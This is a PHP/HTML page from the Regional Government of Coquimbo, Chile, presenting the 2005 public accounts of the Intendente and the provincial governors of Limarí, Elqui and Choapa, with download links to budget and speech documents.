<?php
global $c;
function ctacab() {
global $c;?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Cuenta P&uacute;blica 2005 - Gobierno Regional de Coquimbo</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="css/ctapub04.css" type="text/css" media="screen" />
</head>

<body id="home">
<div id="wrap"> 
  <p id="theme"></p>
  <div id="logo"></div>
  <div id="title"> 
    <h1>... hacia una nueva regi&oacute;n de coquimbo &nbsp;&nbsp;&nbsp;</h1>
    <!--<h2>texto dentro de este apartado enunciado</h2>-->
  </div>
  <?php
}	
	


function ctamenu() { 
global $c;?>
  <hr class="hide" />
  <div id="sidebar"> 
    <!-- lado derecho -->
    <h3>Men&uacute; Navegaci&oacute;n</h3>
    <ul id="quickbits">
      <li> <a href="<?php $PHP_SELF ?>?c=p" title="Cuenta P&uacute;blica Intendente Felipe del R&iacute;o Goudie.  "> 
        Gesti&oacute;n Gobierno Regional </a> </li>
      <li> <a href="<?php $PHP_SELF ?>?c=e" title="Cuenta P&uacute;blica Gobernadora Provincial de Elqui.  "> 
        Gesti&oacute;n Provincia de Elqui </a> </li>
      <li> <a href="<?php $PHP_SELF ?>?c=l" title="Cuenta P&uacute;blica Gobernador Provincia de Limar&iacute;.  "> 
        Gesti&oacute;n Provincia de Limar&iacute; </a> </li>
      <li><a href="<?php $PHP_SELF ?>?c=c" title="Cuenta P&uacute;blica Gobernador Provincia de Choapa.  ">
        Gesti&oacute;n Provincia de Choapa</a>
      </li>
	  
		<hr />
		<li><a href="cta04.php" title="Cuenta P&uacute;blica Gesti&oacute;n 2004  ">
        Cuenta P&uacute;blica Gesti&oacute;n 2004</a>
      </li>	  
    </ul>
    <h3>Descargas</h3>
    <ul id="quickbits">
      <?php if ( $c == "p" || !isset($c) ) { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta06intendente.pdf" title="Descargar Discurso Intendente. Documento PDF [78 KB]  " class="more" target="_blank">Discurso Intendente [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta06intendente.doc" title="Descargar Discurso Intendente. Documento WORD [55 KB]  " class="more" target="_blank">Discurso Intendente [versi&oacute;n DOC]</a> </li>
	  <br />
	  
      <?php }
	  
if ($c == "e") { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta05elqui.pdf" title="Descargar Discurso Gobernador Provincial de Elqui. Documento PDF [0.11 MB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta05elqui.doc" title="Descargar Discurso Gobernador Provincial de Elqui. Documento WORD [87 KB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n DOC]</a> </li>

      <?php }

if ($c == "l") { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta05limari.pdf" title="Descargar Discurso Gobernador Provincial de Limari. Documento PDF [0.11 MB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta05limari.doc" title="Descargar Discurso Gobernador Provincial de Limari. Documento WORD [0.12 MB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n DOC]</a> </li>
      <?php } 

if ($c == "c") { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta05choapa.pdf" title="Descargar Discurso Gobernadora Provincial de Choapa. Documento PDF [54.74 KB]  " class="more" target="_blank">Discurso Gobernadora [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta05limari.doc" title="Descargar Discurso Gobernadora Provincial de Choapa. Documento WORD [48 KB]  " class="more" target="_blank">Discurso Gobernadora [versi&oacute;n DOC]</a> </li>
      <?php } ?>
	  
	  
    </ul>
	
<?php

      if ( $c == "p" || !isset($c) ) { ?>
    <h3>Otras Descargas</h3>
    <ul id="quickbits">
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro01.pdf" title="Descargar documento PDF [0.13 MB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 01 [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icexcel.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro01.xls" title="Descargar documento EXCEL [86.50 KB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 01 [versi&oacute;n EXCEL]</a> </li>
		<hr />

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro02.pdf" title="Descargar documento PDF [0.13 MB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 02 [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icexcel.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro02.xls" title="Descargar documento EXCEL [86.50 KB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 02 [versi&oacute;n EXCEL]</a> </li>
		<hr />

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/ctages05.pdf" title="Descargar documento PDF [0.23 MB]  " class="more" target="_blank">Cuenta Anual Gesti&oacute;n 2005 [versi&oacute;n PDF]</a> </li>
		<hr />
		

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/propir06.pdf" title="Descargar documento PDF [0.46 MB]  " class="more" target="_blank">PROPIR 2006 Regi&oacute;n de Coquimbo [versi&oacute;n PDF]</a> </li>
		
		<hr />
		

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/segproCMR.pdf" title="Descargar documento PDF [88.09 KB]  " class="more" target="_blank">Seguimiento Iniciativas de Inversi&oacute;n [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icexcel.png" border="0"/>&nbsp;<a href="descargas/gore/segproCMR.xls" title="Descargar documento EXCEL [72 KB]  " class="more" target="_blank">Seguimiento Iniciativas de Inversi&oacute;n [versi&oacute;n EXCEL]</a> </li>

	</ul>
<?php } ?>


	<div>&nbsp;</div>
	<div align="center"><a href="http://www.adobe.com/es/products/acrobat/readstep2.html" target="_blank"><img src="imagenes/get_adobe_reader.gif" border="0" /></a></div>
	
  </div>
  <!-- end #sidebar -->
  <?php 
}


  
function ctapie() { 
global $c;?>
  <hr class="hide"/>
  <div id="footer"> 
    <p><strong>www.gorecoquimbo.cl</strong>: Gobierno Regional de Coquimbo. Desarrollado 
      por:<a href="mailto:ljimenez@gorecoquimbo.cl">Luis Jim&eacute;nez Villalobos</a>.</p>
  </div>
</div>
<!-- end #wrap -->
<br />
<!-- Begin Nedstat Basic code -->
<!-- Title: Cuenta Pública 2004 -->
<!-- URL: http://www.gorecoquimbo.cl/cuenta/index.php -->
<script language="JavaScript" type="text/javascript" src="http://m1.nedstatbasic.net/basic.js">
</script>
<script language="JavaScript" type="text/javascript" >
<!--
  nedstatbasic("ADXH2wKkN/0uS+aDlVwB5r1KXVWw", 0);
// -->
</script>
<noscript>
<a target="_blank" href="http://www.nedstatbasic.net/stats?ADXH2wKkN/0uS+aDlVwB5r1KXVWw"><img
src="http://m1.nedstatbasic.net/n?id=ADXH2wKkN/0uS+aDlVwB5r1KXVWw"
border="0" width="18" height="18"
alt="Nedstat Basic - Web site estadísticas gratuito
El contador para sitios web particulares"></a><br>
<a target="_blank" href="http://www.nedstatbasic.net/">Contador gratuito</a>
</noscript>
<!-- End Nedstat Basic code -->
</body>
</html>
<?php } 


if ( ( !$HTTP_GET_VARS[c] ) || ( $HTTP_GET_VARS[c] == "p" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">

      <h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>“CREATIVIDAD, EFICIENCIA Y GESTIÓN”, FUE EL LLAMADO DEL INTENDENTE EN LA CUENTA PÚBLICA 2005</h1>
      <!--<p align="center"><img src="imagenes/ctachile.gif" alt="" title="Logo de Chile" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
        <img src="imagenes/cta04.jpg" alt="" title="Logo Cuenta P&uacute;blica 2004" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
        <img src="imagenes/ctagore.gif" alt="" title="Logo Gobierno Regional de Coquimbo" /></p>-->
      <p class="encabezado"> Intendente Ricardo Cifuentes Lillo, en sesión ordinaria del Consejo Regional, y frente a diversas autoridades regionales y representantes de la comunidad, dio cuenta del desarrollo alcanzado por la región de Coquimbo durante el año pasado.</p>

		<p><img src="imagenes/cta05.jpg"  style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5"/></p>

<p class="normal">Tal como lo establece el artículo 26 de la Ley 19.175 sobre Gobierno y Administración Regional, el Intendente Ricardo Cifuentes, entregó a la comunidad los logros alcanzado durante el 2005 y las proyecciones  establecidas para la región al Bicentenario.</p>
	  
<p class="normal">En el Salón Vicuña de la casa de Gobierno Regional, el Intendente, dijo valoró el desarrollo del país alcanzado en los dieciséis años de Gobierno de la Concertación,  y llamó a los habitantes de la región de Coquimbo a “construir en conjunto”, marcado con ello los principales lineamiento que tendrá la Estrategia de Desarrollo al 2020.</p>

<p class="normal">El Intendente Ricardo Cifuentes señaló al respecto cinco criterios básicos fundamentales para el desarrollo del Gobierno y la comunidad en los próximos años. “Debemos desarrollar una gestión creativa y con eficiencia, capaz de guiar y orientar esa gestión con mirada regional. Debemos actuar con sentido político, responder a la comunidad con orientaciones claras, precisas, posibles  y estratégicas. Debemos creer en nuestra gente, y aquí, la institucionalizad, representada en sus profesionales, técnicos, y funcionarios, es un recurso de primer nivel que debemos optimizar. Debemos incorporar activamente a la sociedad civil al accionar del Gobierno, y ser proactivos en las acciones que cada uno debemos desempeñar. Y finalmente entre las autoridades de gobierno y del sector público,  debe existir  y primar una vocación por los acuerdos y a la vez una visión de Región basada en el   Construir en Conjunto”, subrayó.</p>

<p class="normal">Junto con ello, reconoció la Gestión 2005, especialmente en la figura del ex Intendente Felipe del Río, los consejeros regionales, Seremis, Directores de Servicio y funcionarios públicos de la gestión anterior.</p>

<p class="normal">Sobre esta base Ricardo Cifuentes mencionó los principales logros del año pasado, que han permitido generar “este clima de entendimiento y trabajo en equipo, que se ha transformado en una fortaleza insustituible de nuestro territorio”, aseveró.</p>

<p class="normal">Fue así que destacó los logros obtenidos en el plano del Desarrollo Económico y Fomento Productivo, donde enfatizó las cifras en empleo, que el año 2005 aumentaron a  14.340  nuevos puestos de trabajo. Esto se suma a las cifras entregadas por SENCE que dan cuenta de 40.349 personas capacitadas durante el 2005, con una inversión que superó los 3.890 millones de pesos. Esto permitió generar 5.425 personas empleos.</p>

<p class="normal">Otro hito económico resultaron ser las exportaciones. Estas crecieron respecto del año 2004, en un 40%.  Este aumento se explica en gran medida por la producción minera del cobre, complementado con la exportación agrícola y de productos del mar. Lo que en el período 2004-2005, representa 1.800 millones de dólares.</p>

<p class="normal">En materia agrícola,  el Intendente subrayó que en el 2005 se concluyó  un período de cinco años, con un aumento del 25% de las exportaciones. En tanto, en el sector acuícola, relevó la consolidación de la superficie en hectáreas cultivadas, lo que representó entre otros  aspectos, generar  un  67%  de la producción nacional de ostiones. Finalmente, en el ámbito turístico, Ricardo Cifuentes destacó que el año pasado se consolidó la llegada de personas a la zona,  con el arribo de 600 mil visitas durante el período estival, lo que evidencia a este sector como un pilar importante del desarrollo regional.</p>

<p class="normal">En cuanto al apoyo a la micro, pequeña  y mediana empresa, se recalcó en la Cuenta Pública,  el préstamo gestionado por CORFO, a través de su Gerencia de Intervención Financiera, a la Cooperativa Agrícola Pisquera Elqui (CAPEL),  para transformar a ésta en una institución financiera no bancaria, que otorga micro créditos a sus cooperados. Similar acción se llevó a cabo con la Cooperativa Agrícola Control Pisquero de Elqui y  Limari, por un monto de 600 millones de pesos.</p>

<p class="normal">En tanto, tres fondos concursables entre el Programa Más Región y SERCOTEC, lograron beneficiar a 92 microempresarios.</p>

<p>&nbsp;</p>

<p class="normal"><strong>DESARROLLO SOCIAL</strong><br />
Los avances en equidad social logrados en la gestión 2005, quedaron demostrados en los logros obtenidos en salud, educación, vivienda y aquellas destinadas a la mujer, jóvenes y niños un avance sustancial.</p>

<p class="normal">En el plano de la salud, se acentuó la inversión que superó  los 2.500  millones de pesos.  En educación, fue relevante el aumento de la cobertura en educación parvularia, superando en un 111% la meta establecida para el año pasado. En tanto, para la Jornada Escolar Completa, se indicó que 18  nuevas escuelas y liceos, integrando a diez mil nuevos alumnos a esta modalidad.</p>

<p class="normal">En vivienda, uno de los ámbitos prioritarios del Gobierno, se entregaron 4.963 subsidios, lo que significó una inversión de 17 mil millones de pesos. Junto con ello, en pavimentos participativos fueron favorecieron a 101 proyectos, con una inversión de 2.900  millones de pesos.</p>

<p class="normal">En el marco de las políticas de género, 3.725 mujeres fueron beneficiadas con programas de capacitación y financiamiento para pequeños emprendimientos. Iniciativas apoyadas por FOSIS, SERCOTEC, PRODEMU, SERNAM, Más Región y el Programa Chile Barrios, entre otros.</p>

<p class="normal">Con relación al desarrollo de la Infancia, uno de los grupos prioritarios de apoyo del Gobierno, se estableció durante el 2005 un programa de extensión horaria. “Esto permitió la atención de 100 niños atendidos el  2004, a 409 párvulos atendidos el  2005”, afirmó el Intendente.</p>

<p class="normal">Especial hincapié se realizó en el combate al consumo de drogas, esfuerzos que se han traducido en el apoyo al tratamiento y rehabilitación, permitiendo la atención de 342 personas el 2005. En este período se creo también el primer Centro de Tratamiento Residencial para la población Infanto -  Adolescente.</p>

<p class="normal">En la lucha por la superación de la pobreza el Programa Chile Solidario beneifició a 6.764 familias durante el 2005. De igual forma se ha avanzado en la focalización de la pobreza, para reorientar la inversión pública y así enfrentar y combatir de manera más efectiva este flagelo.</p>

<p class="normal">En materia de seguridad ciudadana el Intendente Cifuentes destacó el aporte realizado por el Gobierno Regional para la adquisición de equipamiento policial, entre ellos, 48 vehículos policiales, por un monto de 480 millones de pesos. “En esta misma dimensión la implementación del Plan Cuadrante durante este año 2006, permitirá una mejor dotación de Carabineros, lo que irá acompañado de mayor infraestructura y mayor equipamiento, con una inversión que alcanzará los 3.400 millones de pesos”, relevó el Intendente.</p>

<p>&nbsp;</p>
<p class="normal"><strong>INFRAESTRUCTURA</strong><br />
En cuanto a las obras de infraestructura que se encuentran ejecutadas y que ya están siendo utilizadas por la comunidad, el Intendente enfatizó en la remodelación de la Caleta Pesquera de Peñuelas; el mejoramiento vial, camino interior que une Combarbalá y Cogotí 18; el paso superior 4 esquinas en la Ruta 5 Norte; la continuación de la Av. Costanera que une de manera definitiva las playas de  Coquimbo y La Serena; y la construcción del Centro de Salud Pedro Aguirre Cerda de La Antena que pronto entrará en funcionamiento.</p>

<p class="normal">“Estas obras que en su conjunto superan los 4.500 millones de pesos de inversión, representan y conllevan un importante impacto social, productivo y económico. Estas obras significan un inmenso aporte para el crecimiento de la Región de Coquimbo”, manifestó el Intendente.</p>

<p class="normal">En la cuenta también se destacó la construcción y puesta en funcionamiento del Centro de Reclusión Penitenciaria de Huachalalume; y cinco grandes obras de infraestructura que significarán un gran aporte para el desarrollo de la Región. Entre ellas, el Puerto Pesquero Artesanal de Coquimbo, la Comisaría de Las Compañías, proyecto emblemático y anhelado por la comunidad de ese sector; el abovedamiento del Canal Romeral de Ovalle; proyectos de instalación de Agua Potable Rural, en distintas comunas de la región; y la construcción definitiva del Puente Vicente Zorrilla.</p>

<p class="normal">“Estas obras en su conjunto alcanzan una inversión que supera los 17 mil millones de pesos, y beneficiarán a mas de cuatrocientas mil personas de la Región de Coquimbo”, indicó  finalmente el Intendente.</p>

<p>&nbsp;</p>
<p class="normal">Al concluir el evento, el Intendente extendió una copia de la Gestión del Gobierno Regional a cada uno de los consejeros y además, junto a los presidente de cada Comisión del CORE, subió la Cuenta Pública 2005 a Internet, en un acto de transparencia y eficiencia del servicio público. Esta se encuentra disponible en la página web www.gorecoquimbo.cl</p>
<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}



if (($HTTP_GET_VARS[c] == "l" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">
<h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>CON UN LLAMADO AL COMPROMISO DE LOS SERVICIOS PÚBLICOS GOBERNADOR DE LIMARI ENTREGA CUENTA PÚBLICA 2005</h1>
	  <p class="encabezado">Con asistencia de autoridades Regionales, Provinciales y Comunales, además de dirigentes de organizaciones sociales y público en General, se llevó a efecto en la Gobernación Provincial de Limarí la Cuenta Pública de la Gestión 2005 y la exposición de la Agenda Temática 2005.</p>	
	  
<p><img src="imagenes/cta05limari.jpg" style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5" alt="" title=" Cuenta P&uacute;blica Gobernaci&oacute;n Provincial de Limar&iacute;  "/></p>

      <p class="normal">En la ocasión los Jefes de los Comités de: Desarrollo Humano y Social, Infraestructura y Territorio e Innovación y Desarrollo Productivo,  Sra. Juana Vasquez, Eduardo Plaza y Sr. Claudio Pinto, respectivamente, dieron cuenta de los logros de la gestión 2005 de los distintos servicios públicos que los componen.</p>
	  
       <p class="normal">Luego de las exposiciones indicadas, el Gobernador de Limarí Sr. Iván Hernández Gentina, expuso los principales aspectos de la Agenda Temática 2006.   “Esta agenda está basada en las cinco áreas temáticas que reflejan las prioridades del Gobierno de nuestra Presidenta, he diseñado para el año 2006, una Agenda de Trabajo, que incluyendo las 36 medidas a aplicar en los primeros 100 días de Gobierno,  el diseño de una Estrategia de Desarrollo Provincial, que formará parte de un diseño Regional, los compromisos de todos los SSPP y los productos estratégicos que corresponde entregar a la Gobernación, constituyen desde ya nuestro compromiso de gestión, con la comunidad de la Provincia”, manifestó la primera autoridad provincial.</p>

<p class="normal">El desafío que nos espera para este año es importante y motivador.  Para ello cuento con el compromiso de todos los funcionarios públicos de la provincia, los que asumimos este desafío con optimismo, alegría y con la certeza de que estamos aportando de manera efectiva y concreta al logro del Plan de Gobierno de la Presidenta Bachelet y por ende al mejoramiento de las condiciones de vida de todos los habitantes de esta provincia, terminó diciendo el Jefe Provincial.</p>

<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}



if (($HTTP_GET_VARS[c] == "e" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">
<h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>Gobernador de Elqui Rolando Calderón Rindió Su Cuenta Pública</h1>
<p class="encabezado">La provincia de Elqui durante el 2005 avanzó en termas como la Seguridad Ciudadana a través del Programa Barrio Más Seguro, Comuna Más Segura y la creación del nuevo Comité de Seguridad Pública.</p>
<p class="encabezado">Además durante ese año se realizó el II Foro de Corredor Bioceánico Central donde se discutieron temas concernientes al paso Aguas Negras.</p>
<p class="encabezado">Uno de los énfasis del gobernador Calderón para el presente año es la participación ciudadana.</p>

<p><img src="imagenes/cta05elqui.jpg" style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5" alt="" title=" Cuenta P&uacute;blica Gobernaci&oacute;n Provincial de Elqui  "/></p>


<p class="normal">La Sede de la Junta de Vecinos Nº 10 Llano Virgilio en Coquimbo, fue el lugar elegido por el Gobernador Provincial de Elqui, Rolando Calderón Aranguiz para dar a conocer los logros y principales hitos de la Gobernación durante la gestión 2005.</p>

<p class="normal">Tomando como eje principal los temas de Seguridad Ciudadana y el Paso agua Negra, Calderón manifestó que la provincia debe conocer lo realizado para continuar con claridad hacia el  futuro y de ese modo asumir los desafíos que se vienen por  delante.</p>

<p class="normal">La máxima autoridad provincial señaló que uno de los principales logros de la Gobernación durante el año 2005 es la inversión realizada para mejorar la seguridad de sus ciudadanos, esto se logró a través del programa Barrio más Seguro, que lleva tres años de funcionamiento con satisfactorios resultados en la provincia, focalizando su accionar en los sectores de Tierras Blancas, Las Compañías y el año pasado en la población Juan XXIII de la Antena. Es en este último  lugar donde se han materializado dos proyectos a cargo de la Junta de vecinos Nº 1 San Francisco con una inversión total cercana a los 25 millones de pesos del Fondo Presidente de la República.</p>

<p class="normal">Calderón agregó que gracias a este fondo también se desarrollaron otros tres proyectos ejecutados en los sectores de Villa Lambert, Los Llanos y Villa El Romero de la comuna de La Serena.</p>

<p class="normal">Otros de los instrumentos enumerados por la autoridad para combatir la delincuencia en conjunto con los vecinos son los diálogos permanentes sostenidos en terreno con las policías, Municipios, servicios públicos y SEREMIS además de una activa participación en el programa Comuna más Segura que se encuentra en implementación en las comunas de La Serena y Coquimbo.</p>

<p class="normal">Informó además, que la Gobernación de Elqui formó un grupo de trabajo de seguridad pública en el transporte colectivo menor, acogiendo el planteamientos expuesto por los gremios de la actividad. Durante el 2005 se  transfirió un mapa con soporte informático que permitió georreferenciar los sectores según peligrosidad.</p>

<p>&nbsp;</p>
<p class="normal"><strong>Agua Negra</strong><br />
En Cuanto a los comités de frontera para el paso Agua Negra, el Gobernador Calderón señaló que desde el año pasado estas instancias pasaron a llamarse “Comités de Integración” que tienen como finalidad el acercamiento con Argentina. La autoridad informó en esta materia que el año pasado se constituyó la comisión permanente de alcaldes e intendentes y se firmó el acuerdo de San Juan suscrito por las autoridades de la época; alcaldes; consejeros regionales; trabajadores y diputados.</p>

<p class="normal">Del mismo modo se refirió a la realización del  II Foro Corredor Bioceánico Central que se realizó a fines del año y que contó con la presencia de Parlamentarios de la región centro de Argentina. En la ocasión se tomaron importantes acuerdos como realizar acciones conducentes a la creación de una secretaría ejecutiva. También la creación de una Comisión Público Privada Económica, formada por representantes de las regiones, provincias y estados miembros del Corredor Bioceánico Central.</p>

<p class="normal">Otro de los logros importantes en pos de la integración ocurridos durante la gestión 2005 es la remodelación del Complejo Fronterizo Juntas del Toro, con una inversión superior a 450 millones de pesos, lo cual lo ubica entre los más modernos del país.</p>

<p>&nbsp;</p>
<p class="normal"><strong>Inversiones</strong><br />
En la Cuenta 2006, el Gobernador de Elqui también señaló los avances y apoyo al empresariado provincial, a través de proyectos dependientes de CORFO, Sercotec e INDAP que ayudó a pescadores artesanales, pequeños y mediano agricultores, pequeños y medianos empresarios, entre otros, en aspectos tecnológicos, de infraestructura o para contratación de mano de obra. Calderón puso énfasis en que todas estas medidas  “han sido reales ayudas para nuestra gente; el emprendimiento lo han vivido jóvenes y adultos, ya sea en proyectos colectivos o individuales”.</p>


<p>&nbsp;</p>
<p class="normal"><strong>Infraestructura</strong><br />
Calderón también puso énfasis en los avances estructurales en la provincia, obras como la construcción del puerto pesquero artesanal de Coquimbo, que dará un espacio físico que facilitará las labores asociadas al mar y entregará un agregado turístico al sector se encuentra en ejecución. También señaló obras viales como los caminos de acceso a Las Cardas, las barrancas y Algarrobito, y los caminos Vicuña-Hurtado, Islon-Las Rojas-Pelícana e Islon –El Romero-Lambert con una inversión total superior a los M$27.500 y que son parte de las gestiones realizadas por el gobierno provincial el 2005.</p>


<p>&nbsp;</p>
<p class="normal"><strong>Social</strong><br />
Dentro de los programas de la gobernación está la ayuda a los adultos mayores a través de proyectos del SENAMA, el 2005 este fondo benefició 42 iniciativas para mejorar la calidad de vida de los mayores de 60 años con una inversión que superó los $28 millones. Calderón recordó que para la Gobernación el bienestar de los adultos mayores es fundamental, es por ello que el año 2005 se realizó una jornada recreativa llamada “Vive la vida, toda la vida”, en conjunto con el SENAMA y la SEREMI de gobierno y que agrupó a más de mil adultos mayores de las seis comunas de nuestra provincia.</p>


<p class="normal">Enmarcado en la ayuda que se presta al sector rural, el Gobernador señaló que el año pasado se continuó apoyando y asesorando en el fortalecimiento de organización en el  sector caprino, ya que se logró consolidar la conformación de 66 organizaciones locales de crianceros. Además se benefició a 566 personas con bonos compensatorios del Programa de Prevención de la Fiebre Aftosa con una inversión de más de 23 millones de pesos.</p>

<p class="normal">Finalmente Calderón agradeció a los servicios que a nivel provincial ayudan a mejorar la calidad humana y de vida de sus habitantes entregando educación, implementos técnicos, capacitaciones rehabilitación, becas, entre otros servicios fundamentales para seguir adelante incluyendo instancias recreativas y culturales, con lo que se logra integrar a la comunidad y evitar las exclusiones.</p>

<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}


if (($HTTP_GET_VARS[c] == "c" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">
<h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>GOBERNADORA DEL CHOAPA RINDE CUENTA PUBLICA GESTION 2005</h1>
	  <p class="encabezado">Comisiones Técnicas Asesoras, se encargaron de entregar los resultados del 2005. diversas obras de infraestructura ejecutadas durante ese periodo destacaron por el alto beneficio social sobre la población del Choapa.</p>	
	  
<p><img src="imagenes/cta05choapa.jpg" style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5" alt="" title=" Cuenta P&uacute;blica Gobernaci&oacute;n Provincial de Choapa  "/></p>

      <p class="normal">Bajo una modalidad distinta, el Gobierno Provincial del Choapa, entrego su cuenta publica gestión 2005. En esta oportunidad, los presidentes de las comisiones “Desarrollo Humano”, “Fomento Productivo”, “Territorio e Infraestructura” y “Modernización”, rindieron cuenta sobre los logros de cada servicio en materia de inversión pública, programas y políticas aplicadas, y el creciente numero de beneficiarios, muchos de los cuales se encontraban presentes y fueron motivo de espontáneos aplausos.</p>
	  
       <p class="normal">Ante un numero superior a las doscientas personas, entre ellos Alcaldes, Concejales, el ex Gobernador Luis Figueroa, dirigentes, estudiantes, beneficiarios, y jefes de servicios públicos, la Gobernadora del Choapa quiso en esta oportunidad matizar su discurso con la poesía de Benedetti, la cual versa sobre la necesidad de conocerse y establecer diálogos permanentes, fue así que introdujo a los asistentes a la clara misión y objetivos de una Gobernación, especialmente sobre asegurar el orden publico, resguardar y afianzar la seguridad ciudadana, aplicar a cabalidad la gestión territorial e informar a la ciudadanía y otorgar cuando sea el caso, los beneficios del Gobierno.</p>

<p class="normal">Concluida su participación, se inicio la cuenta publica de la Comisión de “Desarrollo Humano”, integrada por mas de once servicios del área social, educacional y de prevención, cuenta que estuvo a cargo de su presidente y Jefe Provincial de Educación Choapa Jorge Villarroel.</p>

<p>&nbsp;</p>
<p class="normal"><strong>OTORGANDO SONRISAS</strong><br />
Mauricio Cáceres, Elizabeth Castillo y Melanie Catalado, son jóvenes estudiantes de liceos de la comuna de Illapel que recibieron durante el año pasado la Beca de Retención Liceo para Todos, ellos son ejemplo de la gama de programas sociales aplicados por el Gobierno, bajo mandato del ex Presidente Ricardo Lagos.</p>

<p class="normal">El trabajo de la comisión de “Desarrollo Humano” quiso reflejar en su exposición que desde el nacimiento del hombre hasta su vejez, recibe apoyo de las políticas públicas del Gobierno, dando cuenta por ejemplo que JUNJI logro durante el 2005 la atención  integral de calidad a Párvulos de  3 meses a 5 años 11 meses, principalmente de sectores pobres a nivel urbano y rural, e implementando cinco jardines infantiles clásicos en cada una de las comunas con atención a 656 párvulos, así también se implementaron 32 jardines infantiles familiares en diferentes  sectores rurales en Illapel, Canela, Los Vilos y Salamanca con una atención de 733 niños y niñas.</p>

<p class="normal">Mientras que uno de los logros mas significativos, fue la implementación de la reforma de la educación parvularia  con capacitación a cien funcionarios profesionales y técnicos.</p>

<p class="normal">Concretamente, en el ámbito educacional, resaltaron las inversiones en Jornada Escolar Completa, incorporando siete establecimientos educacionales con un gasto de $1.614.000 lo que permitió beneficiar directamente a 1736 alumnos.</p>

<p class="normal">Por otra parte, se destaco el otorgamiento de becas como la de retención de alumnos con riesgo de deserción a un total de 102 alumnos(as), gracias a esto 90 % de estudiantes continúan sus estudios. Asimismo 529 estudiantes de educación Media y Superior con rendimiento sobresaliente fueron beneficiados con la Beca Presidente de la República, con una inversión de $129 millones sólo para Choapa. Cabe señalar, que se suman a estos logros aquellos que JUNAEB implemento especialmente en programas de Salud, Alimentación, Vivienda, Recreación y entrega de útiles Escolares.</p>

<p class="normal">Por otra parte, gracias a la campaña Contigo Aprendo, 190 adultas alfabetizadas logran aprobar su 4º básico, mientras que 338 personas lograron nivelar estudios en Educación General Básica.</p>

<p class="normal">También resalto la acción de Fosis, a través de sus programas Chile Solidario y Puente, este ultimo invirtió una cifra superior a los $265 millones, logrando que 724 familias egresen exitosamente de los talleres de identificación, salud, educación, dinámica familiar, habitabilidad, trabajo e ingresos.</p>

<p class="normal">La juventud también fue parte de los éxitos del 2005 a través de su participación en el INJUV, que destaco por su récord en alfabetización digital y adquisición del sistema WI-FI gratuito. Sin perder su norte, INJUV capacitó en alfabetización digital linux sólo en Illapel  a 663 personas.</p>

<p>&nbsp;</p>
<p class="normal"><strong>OBRA GRUESA</strong><br />
Infraestructura y Territorio, estuvo representado por el Delegado Provincial del SERVIU, Mario Ortega quien entrego el detalle de las obras ejecutadas el 2005, en materia de viviendas, obras hidráulicas, vialidad y las ejecutadas por el FNDR, entre otras.</p>

